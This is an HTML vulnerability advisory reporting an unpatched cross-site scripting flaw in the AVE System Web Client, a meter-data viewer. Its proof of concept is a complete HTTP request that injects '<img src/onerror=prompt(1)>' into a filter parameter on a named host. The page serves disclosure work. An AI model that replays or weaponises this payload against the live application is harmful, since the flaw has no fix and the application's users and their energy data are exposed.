<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS Vulnerability in AVE System Web Client</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            margin: 20px;
        }
        h1, h2, h3 {
            color: #333;
        }
        .section {
            margin-bottom: 20px;
        }
        code {
            background-color: #f4f4f4;
            padding: 2px 4px;
            border-radius: 3px;
        }
    </style>
</head>
<body>
    <h1>XSS Vulnerability in AVE System Web Client</h1>

    <div class="section">
        <h2>Version Details</h2>
        <p><strong>Version:</strong> AVE System Web Client Version: 2.1.131.13992</p>
        <p><strong>Fixed Version:</strong> None</p>
        <p><strong>CVE ID:</strong> None</p>
        <p><strong>Vulnerability Type:</strong> Cross Site Scripting (XSS)</p>
    </div>

    <div class="section">
        <h2>Description of the Product</h2>
        <p>AVE Web Client is a lightweight version of AVE Client. It doesn’t have to be installed and can be run in any Web browser (Chrome, IE, Firefox, etc.). It is a thin client designed for basic work with AVE (checking the progress of data reading, generating reports, reading and displaying data).</p>
        <p>This module is also intended for outside traders, who need to have a quick overview of customers’ energy consumption, and for end users, who can display only selected data, not complete sets of meter reading data.</p>
    </div>

    <div class="section">
        <h2>Description of the Vulnerability</h2>
        <p>Due to insufficient security measures in all input fields within the application, an XSS (Cross-Site Scripting) vulnerability exists.</p>
    </div>

    <div class="section">
        <h2>Root Cause</h2>
        <p>The causes of the XSS vulnerability stem from processing user input in a way that allows JavaScript execution. For example, if HTML encoding is not applied to input received from users, it should be implemented to prevent providing the browser’s JavaScript engine with tags capable of executing JavaScript.</p>
        <p>Additionally, a whitelist should be created for attributes that allow JavaScript execution; otherwise, an attacker could inject and execute JavaScript code.</p>
    </div>

    <div class="section">
        <h2>Proof of Concept (PoC)</h2>
        <img src="resim.png"> </img>

<code>
GET /website/api/GetSchedulerProfiles.rails?_dc=1730446398457&sessionId=e59a5def61a9f6f39d776dad156c852c&schedulerIds=573&filter={"name":"<img src/onerror=prompt(1)>"}&page=1&start=0&limit=50 HTTP/1.1
Host: www.ave-system.com
Cookie: <REDACTED>
Sec-Ch-Ua-Platform: "macOS"
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not?A_Brand";v="99", "Chromium";v="130"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.59 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://www.ave-system.com/website/jsclient/index.html
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Connection: keep-alive
</code>
        
    </div>

    <div class="section">
        <h2>Impact of XSS Vulnerabilities</h2>
        <p>The actual impact of an XSS attack generally depends on the nature of the application, its functionality and data, and the status of the compromised user. For example:</p>
        <ul>
            <li>In a brochureware application, where all users are anonymous and all information is public, the impact will often be minimal.</li>
            <li>In an application holding sensitive data, such as banking transactions, emails, or healthcare records, the impact will usually be serious.</li>
            <li>If the compromised user has elevated privileges within the application, then the impact will generally be critical, allowing the attacker to take full control of the vulnerable application and compromise all users and their data.</li>
        </ul>
    </div>
</body>
</html>
